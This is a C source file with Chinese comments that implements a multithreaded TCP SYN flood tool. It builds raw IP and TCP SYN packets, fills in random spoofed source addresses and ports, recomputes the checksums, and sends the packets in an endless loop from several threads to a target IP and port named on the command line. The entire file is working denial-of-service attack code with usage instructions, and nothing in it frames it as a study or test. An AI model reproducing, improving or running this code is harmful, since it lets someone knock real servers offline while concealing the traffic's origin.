//
// Created by wu on 2019/12/11.
//

#include <stdio.h>
#include <netinet/ip.h>//Provides declarations for ip header
#include <netinet/tcp.h>//Provides declarations for tcp header
#include <arpa/inet.h>
#include <stdlib.h> //for exit(0);
#include <string.h> //memset,memcpy
#include <pthread.h>
#include <zconf.h>
#include <errno.h>

//needed for checksum calculation
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_or_udp_length;
};

//checksum is 16bit,should use unsigned short
static unsigned short calculate_checkcsum(unsigned short *ptr, int pktlen) {
    register uint32_t csum = 0;

    //add 2 bytes / 16 bits at a time!!
    while (pktlen > 1) {
        csum += *ptr++;
        pktlen -= 2;
    }

    //add the last byte if present
    if (pktlen == 1) {
        csum += *(uint8_t *) ptr;
    }

    //add the carries
    csum = (csum >> 16) + (csum & 0xffff);
    csum = csum + (csum >> 16);

    //return the one's compliment of calculated sum
    return ((short) ~csum);
}

int src_port;       // src port 16位 0~65535 *用unsigned short就够了，但是要用负数区分是否使用随机值，所以要多申请一些空间，下面的同理
long src_inet_addr; // src ip的二进制表示 32位
int dst_port;       // dst port 16位 0~65535
long dst_inet_addr; // dst ip的二进制表示 32位
int thread_count = 1;

int send_socket = -1;
struct sockaddr_in dest;

void send_syn_packet() {
    // tcp-datagram packet.size is size of iphdr + size of tcphdr
    char datagram[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    bzero(datagram, sizeof(datagram));

    // 将 ip 首部指针和 tcp 首部指针指向各自的位置，
    struct iphdr *ip_header = (struct iphdr *) datagram;
    struct tcphdr *tcp_header = (struct tcphdr *) (datagram + sizeof(struct iphdr));

    // 填充 ip 首部字段
    ip_header->ihl = 5;                     //普通 IP 数据报
    ip_header->version = 4;                 //IPv4
    ip_header->tos = 0;                     //type of service
    ip_header->tot_len = sizeof(datagram);
    ip_header->id = 0;                      //自定 IP 包标识，方便筛选
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_TCP;      //指定承载的是 TCP 数据包
    ip_header->check = 0;                   //之后需要计算校验和
    // ip_header->saddr在for循环里动态修改
    //ip_header->saddr = src_inet_addr;
    ip_header->daddr = dst_inet_addr;

    //放到下面的for循环去计算，因为在这里计算了也没用，某个字段修改后，还是要重新计算，浪费cpu资源
    //计算 ip 校验和，两个字节
    //ip_header->check = calculate_checkcsum((unsigned short*) datagram, sizeof(datagram));

    // 填充 tcp 首部字段
    // tcp_header->source在for循环里动态修改
    //tcp_header->source = htons(src_port); //htons means host to network short
    tcp_header->dest = htons(dst_port);     //if spec value < 255(8bit) , there is no need to use htons
    tcp_header->seq = 0;                    //自定义 seq 序号，方便筛选
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;                   //tcp header size ,5行,每行4个字节（32bit）
    tcp_header->fin = 0;
    tcp_header->syn = 1;                    //构造三次握手中的第一次，SYN 置 1
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->window = htons(65535);
    tcp_header->check = 0;                  //之后需要计算校验和
    tcp_header->urg_ptr = 0;

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    //借助伪头部计算 tcp 校验和
    struct pseudo_header *psh = (struct pseudo_header *) pseudogram;
    // psh.source_address在for循环里动态修改
    //psh.source_address = src_inet_addr;
    psh->dest_address = dst_inet_addr;
    psh->placeholder = 0;
    psh->protocol = IPPROTO_TCP;
    psh->tcp_or_udp_length = htons(sizeof(struct tcphdr));
    //放到下面的for循环去计算，因为在这里计算了也没用，某个字段修改后，还是要重新计算，浪费cpu资源
    //memcpy(pseudogram+sizeof(struct pseudo_header_tcp), tcp_header, sizeof(struct tcphdr));

    //计算 tcp 校验和
    //tcp_header->check = calculate_checkcsum((unsigned short *) pseudogram, psize);

    //↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑至此，第一次握手的 TCP/IP 数据包构造完毕↑↑↑↑↑↑↑↑↑↑↑↑

    // 随机数种子
    srand((unsigned int) time(0));
    unsigned int rand_unsigned_int32 = 0;

    unsigned int rand_src_ip = src_inet_addr;
    unsigned short rand_src_port = src_port;

    for (;;) {
        // for fastest speed
        if (src_inet_addr < 0 || src_port < 0) {
            rand_unsigned_int32 = (unsigned int) random();
            if (src_inet_addr < 0) {
                rand_src_ip = rand_unsigned_int32;
            }
            if (src_port < 0) {
                rand_src_port = (unsigned short) (rand_unsigned_int32 % 40000 + 20000);
            }
        }

        //******IP首部******
        // 篡改源地址 ip_header->saddr
        ip_header->saddr = rand_src_ip;

        //计算 ip 校验和，两个字节
        ip_header->check = calculate_checkcsum((unsigned short *) datagram, sizeof(datagram));

        //******TCP首部******
        // 篡改源端口号 tcp_header->source
        tcp_header->source = htons(rand_src_port);
        //******pseudo_header*******
        psh->source_address = rand_src_ip;
        memcpy(pseudogram + sizeof(struct pseudo_header), tcp_header, sizeof(struct tcphdr));

        //计算 tcp 校验和
        tcp_header->check = calculate_checkcsum((unsigned short *) pseudogram, psize);

        //↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑至此，第一次握手的 TCP/IP 数据包构造完毕↑↑↑↑↑↑↑↑↑↑↑↑

        ssize_t bytes_sent = sendto(
                send_socket, datagram, sizeof(datagram),
                0, (struct sockaddr *) &dest, sizeof(dest)
        );

        if (bytes_sent < 0) {
            printf("ERROR(%d):%s\n", errno, strerror(errno));
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("usage:"
               "./<script_name> "
               "<src_ip> "
               "<src_port> "
               "<dst_ip> "
               "<dst_port> "
               "<thread_count>\n"
               "\t-1 for random,any argument can not be 0.\n");
        exit(1);
    }

    int i;
    for (i = 1; i < argc; i++) {
        if (i == 1) {
            //用户会输入-1或者正常的ip地址
            int ip = atoi(argv[i]);
            if (ip < 0) {
                src_inet_addr = -1;
                printf("src_ip is random\n");
            } else {
                src_inet_addr = inet_addr(argv[i]);
                printf("src_ip = %s\n", argv[i]);
            }
            continue;
        }
        if (i == 2) {
            //用户会输入-1或者正常的端口
            src_port = atoi(argv[i]);
            if (src_port < 0) {
                printf("src_port is random\n");
            } else {
                printf("src_port = %s\n", argv[i]);
            }
            continue;
        }
        if (i == 3) {
            //用户必须输入正常的ip地址
            dst_inet_addr = inet_addr(argv[i]);
            printf("dst_ip = %s\n", argv[i]);
            continue;
        }
        if (i == 4) {
            //用户输必须入正常的端口
            dst_port = atoi(argv[i]);
            printf("dst_port = %s\n", argv[i]);
            continue;
        }
        if (i == 5) {
            thread_count = atoi(argv[i]);
            printf("thread_count = %d\n", thread_count);
            continue;
        }
    }

    // server_addr
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(dst_port);
    dest.sin_addr.s_addr = dst_inet_addr;

    // 创建一个使用 TCP/IP 协议并可以构造首部数据的 raw_socket
    int one = 1;
    const int *val = &one;
    if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_IPIP)) < 0) {
        return -1;
    }
    if (setsockopt(send_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        return -1;
    }

    //start multi thread
    pthread_t tids[thread_count];
    int j;
    for (j = 0; j < thread_count; j++) {
        //第一个参数tid，第二个参数线程param，一般传NULL，第三个参数，方法指针，第四个参数，方法的参数列表，如果没有参数就传NULL
        pthread_create(&tids[j], NULL, (void *) send_syn_packet, NULL);
    }
    for (j = 0; j < thread_count; j++) {
        pthread_join(tids[j], NULL);
    }

    // sockfd should close here !

    return 0;
}